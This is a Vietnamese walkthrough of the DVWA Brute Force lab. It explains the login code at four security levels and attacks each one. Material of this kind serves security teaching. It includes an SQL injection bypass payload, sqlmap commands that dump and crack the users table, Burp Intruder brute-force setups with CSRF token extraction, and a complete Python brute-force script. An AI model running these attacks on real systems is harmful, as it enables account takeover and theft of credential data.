# Brute Force (DVWA)

## Đề bài

![image](https://hackmd.io/_uploads/rJnsZdblC.png)

- mục tiêu của chúng ta là dò tìm được mật khẩu của administrator

## LOW LEVEL

- đọc source code mình được:

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Get username
    $user = $_GET[ 'username' ];

    // Get password
    $pass = $_GET[ 'password' ];
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Dưới đây là cách nó hoạt động:

- Kiểm tra xem có tham số 'Login' được gửi đi không thông qua phương thức GET.
- Nếu có, mã sẽ lấy tên người dùng và mật khẩu từ tham số của yêu cầu GET.
- Mật khẩu sau đó được mã hóa bằng hàm md5() để so sánh với mật khẩu trong cơ sở dữ liệu.
- Câu lệnh SQL được sử dụng để tìm kiếm trong cơ sở dữ liệu xem có tồn tại bản ghi nào có tên người dùng và mật khẩu tương ứng không.
- Nếu tồn tại bản ghi, người dùng sẽ được chào mừng và thông tin người dùng (như avatar) sẽ được hiển thị. Điều này ngụ ý rằng người dùng đã đăng nhập thành công.
- Nếu không tìm thấy bản ghi nào hoặc không đúng, thông báo lỗi sẽ được hiển thị.
- Tuy nhiên, mã này không được kiểm tra về bảo mật. Sử dụng các phương pháp như câu lệnh Prepared Statements để ngăn chặn các cuộc tấn công SQL Injection và việc mã hóa mật khẩu một cách an toàn hơn sẽ là những điều quan trọng để thực hiện trong một ứng dụng thực tế.

### Khai thác

- mình thử bypass sql với payload `admin' -- -` và đăng nhập thành công nhưng mục đích của chúng ta vẫn là tìm password của admin

![image](https://hackmd.io/_uploads/SJeHBdbgA.png)

- mình thử dùng sqlmap với lệnh:

```bash
sqlmap -u "http://192.168.1.58/dvwa/vulnerabilities/brute/?username=admin&password=1234&Login=Login#" --cookie="security=low; PHPSESSID=buagnfe6lfhp6q9t2rjv1qulb4" --batch --fingerprint -banner
```

và được

![image](https://hackmd.io/_uploads/HyA59OWxC.png)

![image](https://hackmd.io/_uploads/r1kccubxR.png)

- mình tiếp tục dump các user trong bảng users ra với lệnh

```bash
sqlmap -u "http://192.168.1.58/dvwa/vulnerabilities/brute/?username=admin&password=1234&Login=Login#" --cookie="security=low; PHPSESSID=buagnfe6lfhp6q9t2rjv1qulb4" -T users --dump
```

và được

![image](https://hackmd.io/_uploads/rJprodZxC.png)

- sau đó mình chọn các option để crack password

![image](https://hackmd.io/_uploads/r1odjOWx0.png)

hoặc có thể chọn các option mặc định với lệnh sau

```bash
 sqlmap -u "http://192.168.1.58/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=id5sj964f9vju55b5sfj1dstqa" --batch -T users --dump
```

- và mình được bảng users với password đã được crack

![image](https://hackmd.io/_uploads/HJL9hOWlA.png)

- bỏ qua cách khai thác SQL injection mình sẽ brute force password của các user
- mình đưa request vào intruder để brute force với chế độ cluster bom

![image](https://hackmd.io/_uploads/B1yKFMfg0.png)

- với payload để brute force các bạn có thể tìm từ các nguồn như rockyou

![image](https://hackmd.io/_uploads/SkYcqzGlR.png)

![image](https://hackmd.io/_uploads/ryB7cGGlA.png)

- mình lọc kết quả trả về

![image](https://hackmd.io/_uploads/S1Ww9fGgA.png)

- và mình được tài khoản là **admin:password**

![image](https://hackmd.io/_uploads/HkNyjzzxC.png)

các bạn có thể dungf đoạn code python sau để brute force

```python
#!/usr/bin/python
import requests
import sys
import re
from bs4 import BeautifulSoup

# Variables
target = 'http://localhost'
sec_level = 'low'
dvwa_user = 'admin'
dvwa_pass = 'password'
user_list = 'unix_users.txt'
pass_list = 'unix_passwords.txt'


# Value to look for in response header (Whitelisting)
success = 'Welcome to the password protected area'


# Get the anti-CSRF token
def csrf_token():
    try:
        # Make the request to the URL
        print("\n[i] URL: %s/login.php" % target)
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text)
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print("[i] user_token: %s" % user_token)

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print("[i] session_id: %s" % session_id)

    return session_id, user_token


# Login to DVWA core
def dvwa_login(session_id, user_token):
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        print("\n[i] URL: %s/login.php" % target)
        print("[i] Data: %s" % data)
        print("[i] Cookie: %s" % cookie)
        r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print("\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
        sys.exit(-1)

    # Did we log in successfully?
    if r.headers["Location"] != 'index.php':
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))
        sys.exit(-1)

    # If we got to here, everything should be okay!
    print("\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass))
    return True


# Make the request to-do the brute force
def url_request(username, password, session_id):
    # GET data
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        # Make the request to the URL
        #print("\n[i] URL: %s/vulnerabilities/brute/" % target)
        #print("[i] Data: %s" % data)
        #print("[i] Cookie: %s" % cookie)
        r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Was it a ok response?
    if r.status_code != 200:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print("\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
        sys.exit(-1)

    # We have what we need
    return r.text


# Main brute force loop
def brute_force(session_id):
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list) as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print("[i] Try %s: %s // %s" % (i, USER, PASS))

            # Make request
            attempt = url_request(USER, PASS, session_id)
            #print attempt

            # Check response
            if success in attempt:
                print("\n\n[i] Found!")
                print("[i] Username: %s" % (USER))
                print("[i] Password: %s" % (PASS))
                return True
    return False


# Get initial CSRF token
session_id, user_token = csrf_token()


# Login to web app
dvwa_login(session_id, user_token)


# Start brute forcing
brute_force(session_id)
```

## MEDIUM LEVEL

### Phân tích

- đọc source code mình được

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check the database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( 2 );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

Dưới đây là cách nó hoạt động:

- Khi người dùng gửi biểu mẫu đăng nhập, các tham số username và password sẽ được truyền thông qua URL.
- Đoạn mã này sẽ kiểm tra xem nếu tham số 'Login' đã được gửi (tức là người dùng đã nhấn nút đăng nhập) bằng cách sử dụng hàm isset($\_GET['Login']).
- Sau đó, đoạn mã sẽ sử dụng hàm mysqli_real_escape_string() để loại bỏ các ký tự đặc biệt từ tên người dùng và mật khẩu, tránh việc chúng được sử dụng để thực hiện cuộc tấn công SQL Injection.
- Mật khẩu được mã hóa bằng hàm md5() và sau đó được so sánh với mật khẩu đã được lưu trữ trong cơ sở dữ liệu.
- Sau đó, một truy vấn SQL được thực hiện để kiểm tra xem liệu có một bản ghi trong cơ sở dữ liệu tương ứng với tên người dùng và mật khẩu đã cung cấp hay không.
- Nếu có một bản ghi được tìm thấy, người dùng sẽ được đăng nhập thành công và thông tin người dùng cụ thể (như avatar) sẽ được hiển thị.
- Nếu không có bản ghi nào được tìm thấy, thông báo lỗi sẽ được hiển thị.
- Kết nối đến cơ sở dữ liệu sẽ được đóng.
- Thêm vào đó, có một hàm sleep(2) được gọi trong trường hợp việc đăng nhập không thành công, có thể là một biện pháp nhằm ngăn chặn các cuộc tấn công Brute-force

vậy đoạn code đã có cơ chế ngăn chặn SQL injection và làm chậm quá trình brute force

### Khai thác

- dù làm chậm quá trình brute force nhưng nếu có bộ từ điển chất lượng chúng ta vẫn có thể lấy được tài khoản admin nhanh chóng

- mình đưa request vào intruder để brute force với chế độ cluster bom

![image](https://hackmd.io/_uploads/HyJlCzzlA.png)

- với payload để brute force các bạn có thể tìm từ các nguồn như rockyou

![image](https://hackmd.io/_uploads/SkYcqzGlR.png)

![image](https://hackmd.io/_uploads/ryB7cGGlA.png)

- mình lọc kết quả trả về

![image](https://hackmd.io/_uploads/S1Ww9fGgA.png)

- và mình được tài khoản là **admin:password**

![image](https://hackmd.io/_uploads/SJNcRGMxR.png)

## HIGH LEVEL

### Phân tích

- đọc source code mình được

```php
<?php

if( isset( $_GET[ 'Login' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_GET[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_GET[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Check database
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    if( $result && mysqli_num_rows( $result ) == 1 ) {
        // Get users details
        $row    = mysqli_fetch_assoc( $result );
        $avatar = $row["avatar"];

        // Login successful
        echo "<p>Welcome to the password protected area {$user}</p>";
        echo "<img src=\"{$avatar}\" />";
    }
    else {
        // Login failed
        sleep( rand( 0, 3 ) );
        echo "<pre><br />Username and/or password incorrect.</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Dưới đây là cách nó hoạt động:

- Đầu tiên, nó kiểm tra xem nếu tham số 'Login' đã được gửi (tức là người dùng đã nhấn nút đăng nhập) bằng cách sử dụng hàm `isset($_GET['Login']).`
- Sau đó, nó kiểm tra token chống CSRF bằng cách gọi hàm checkToken(). Hàm này so sánh token được gửi từ biểu mẫu (trong tham số 'user_token') với token lưu trữ trong phiên làm việc (trong biến `$_SESSION['session_token'])`. Nếu không khớp, nó sẽ chuyển hướng người dùng đến trang 'index.php'. Điều này giúp ngăn chặn các cuộc tấn công CSRF.
- Tiếp theo, nó sử dụng hàm stripslashes() để loại bỏ các ký tự backslash trong tên người dùng và mật khẩu. Điều này là một biện pháp bảo mật để ngăn chặn các cuộc tấn công dựa trên ký tự backslash.
- Sau đó, nó sử dụng hàm mysqli_real_escape_string() để ngăn chặn cuộc tấn công SQL Injection bằng cách loại bỏ các ký tự đặc biệt từ tên người dùng và mật khẩu.
- Mật khẩu sau đó được mã hóa bằng hàm md5() và so sánh với mật khẩu đã được lưu trữ trong cơ sở dữ liệu.
- Nếu có một bản ghi được tìm thấy, người dùng sẽ được đăng nhập thành công và thông tin người dùng cụ thể (như avatar) sẽ được hiển thị.
- Nếu không có bản ghi nào được tìm thấy, thông báo lỗi sẽ được hiển thị. Trong trường hợp đăng nhập không thành công, hàm sleep(rand(0, 3)) được gọi để ngẫu nhiên làm chậm quá trình, có thể là một biện pháp nhằm ngăn chặn các cuộc tấn công Brute-force.
- Cuối cùng, kết nối đến cơ sở dữ liệu sẽ được đóng.
- Cuối cùng, hàm generateSessionToken() được gọi để tạo ra một token mới để sử dụng cho lần đăng nhập tiếp theo và lưu trữ trong phiên làm việc. Điều này giúp ngăn chặn các cuộc tấn công CSRF bằng cách tạo ra một token mới sau mỗi lần đăng nhập.

vậy mỗi lần request lên server chúng ta cần phải update lại token crsf

![image](https://hackmd.io/_uploads/HJLJMQfe0.png)

### Khai thác

- mình đưa request vào intruder để brute force với chế độ Pitckfork

![image](https://hackmd.io/_uploads/S1byO7MgA.png)

- với payload để brute force các bạn có thể tìm từ các nguồn như rockyou

![image](https://hackmd.io/_uploads/ByEQcQGl0.png)

- với payload 2 mình sẽ trích xuất token

![image](https://hackmd.io/_uploads/Sk-LOQGgA.png)

- mình lọc giá trị token

![image](https://hackmd.io/_uploads/Syi5OQGg0.png)

- mình lọc kết quả trả về

![image](https://hackmd.io/_uploads/Hy5kFXfe0.png)

![image](https://hackmd.io/_uploads/S15lKmMg0.png)

tạo pool mới để lần lượt các tiến trình request

![image](https://hackmd.io/_uploads/Sk3EFXzeA.png)

- và mình được tài khoản là **admin:password**

![image](https://hackmd.io/_uploads/BJo8qXfeA.png)

## IMPOSSIBLE LEVEL

### Phân tích

- đọc source code mình được:

```php
<?php

if( isset( $_POST[ 'Login' ] ) && isset ($_POST['username']) && isset ($_POST['password']) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Sanitise username input
    $user = $_POST[ 'username' ];
    $user = stripslashes( $user );
    $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Sanitise password input
    $pass = $_POST[ 'password' ];
    $pass = stripslashes( $pass );
    $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $pass = md5( $pass );

    // Default values
    $total_failed_login = 3;
    $lockout_time       = 15;
    $account_locked     = false;

    // Check the database (Check user information)
    $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // Check to see if the user has been locked out.
    if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = strtotime( $row[ 'last_login' ] );
        $timeout    = $last_login + ($lockout_time * 60);
        $timenow    = time();

        /*
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
        */

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow < $timeout ) {
            $account_locked = true;
            // print "The account is locked<br />";
        }
    }

    // Check the database (if username matches the password)
    $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR);
    $data->bindParam( ':password', $pass, PDO::PARAM_STR );
    $data->execute();
    $row = $data->fetch();

    // If its a valid login...
    if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {
        // Get users details
        $avatar       = $row[ 'avatar' ];
        $failed_login = $row[ 'failed_login' ];
        $last_login   = $row[ 'last_login' ];

        // Login successful
        echo "<p>Welcome to the password protected area <em>{$user}</em></p>";
        echo "<img src=\"{$avatar}\" />";

        // Had the account been locked out since last login?
        if( $failed_login >= $total_failed_login ) {
            echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";
            echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>{$last_login}</em>.</p>";
        }

        // Reset bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    } else {
        // Login failed
        sleep( rand( 2, 4 ) );

        // Give the user some feedback
        echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";

        // Update bad login count
        $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );
        $data->bindParam( ':user', $user, PDO::PARAM_STR );
        $data->execute();
    }

    // Set the last login time
    $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );
    $data->bindParam( ':user', $user, PDO::PARAM_STR );
    $data->execute();
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

Dưới đây là cách nó hoạt động:

- Đầu tiên, nó kiểm tra xem nếu tham số 'Login' đã được gửi và cả hai tham số 'username' và 'password' cũng đã được gửi bằng cách sử dụng hàm `isset($_POST['Login'])`, `isset($_POST['username'])`, và `isset($_POST['password'])`.
- Tiếp theo, nó kiểm tra token chống CSRF bằng cách gọi hàm checkToken(), tương tự như ở các phiên bản trước. Hàm này đảm bảo rằng token gửi từ biểu mẫu (trong tham số 'user_token') khớp với token lưu trữ trong phiên làm việc (trong biến $\_SESSION['session_token']), ngăn chặn các cuộc tấn công CSRF.
- Tiếp theo, nó sử dụng hàm stripslashes() để loại bỏ các ký tự backslash trong tên người dùng và mật khẩu, sau đó sử dụng mysqli_real_escape_string() để ngăn chặn cuộc tấn công SQL Injection bằng cách loại bỏ các ký tự đặc biệt từ tên người dùng và mật khẩu.
- Mật khẩu sau đó được mã hóa bằng hàm md5() và so sánh với mật khẩu đã được lưu trữ trong cơ sở dữ liệu.
- Nếu tên người dùng và mật khẩu khớp với cơ sở dữ liệu và tài khoản chưa bị khóa do quá nhiều lần đăng nhập sai, người dùng sẽ được đăng nhập thành công và thông tin người dùng cụ thể (như avatar) sẽ được hiển thị. Nếu tài khoản đã bị khóa, thông báo sẽ được hiển thị và yêu cầu người dùng thử lại sau một khoảng thời gian (được xác định bởi biến $lockout_time).
- Nếu tên người dùng hoặc mật khẩu không khớp, hoặc nếu tài khoản đã bị khóa, thông báo lỗi sẽ được hiển thị và số lần đăng nhập sai sẽ được tăng lên trong cơ sở dữ liệu.
- Cuối cùng, thời gian của lần đăng nhập cuối cùng sẽ được cập nhật trong cơ sở dữ liệu.

<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
